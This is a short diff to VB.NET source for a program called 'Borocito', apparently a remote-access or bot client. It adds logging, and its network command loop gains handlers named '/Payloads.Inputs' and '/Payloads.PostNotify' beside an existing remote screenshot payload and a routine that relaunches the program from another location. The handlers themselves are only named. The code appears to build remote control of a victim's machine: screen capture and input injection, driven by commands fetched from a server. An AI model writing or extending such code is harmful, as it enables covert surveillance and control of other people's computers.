@@ -87,7 +87,7 @@ Module Memory
 End Module
 Module StartUp
     Sub Init()
-        AddToLog("Init", "Borocito has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
+        AddToLog("Init", "Borocito " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
             'Iniciar desde otra ubicacion
             RunFromLocation()
@@ -477,6 +477,7 @@ Module Network
 
                 If CMD1 <> Nothing Then
                     Dim CommandCMD As String = CMD1
+                    AddToLog("ReadCommandFile@Network", "Processing: " & CMD1)
                     Try
                         If CommandCMD.Contains("=") Then
                             CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
@@ -585,6 +586,11 @@ Module Network
 
                         ElseIf CMD1.Contains("/Payloads.TakeScreenshot()") Then 'Funciona.
                             Payloads.TakeAnScreenshot()
+                        ElseIf CMD1.Contains("/Payloads.Inputs=") Then 'Funciona.
+                            Payloads.Inputs(CommandCMD)
+                        ElseIf CMD1.Contains("/Payloads.PostNotify=") Then 'Funciona.
+                            Dim Arg() As String = CommandCMD.Split(",")
+                            Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))
 
                             '<--- Borocito Tools --->
                         ElseIf CMD1.Contains("/Stop") Then 'Funciona.
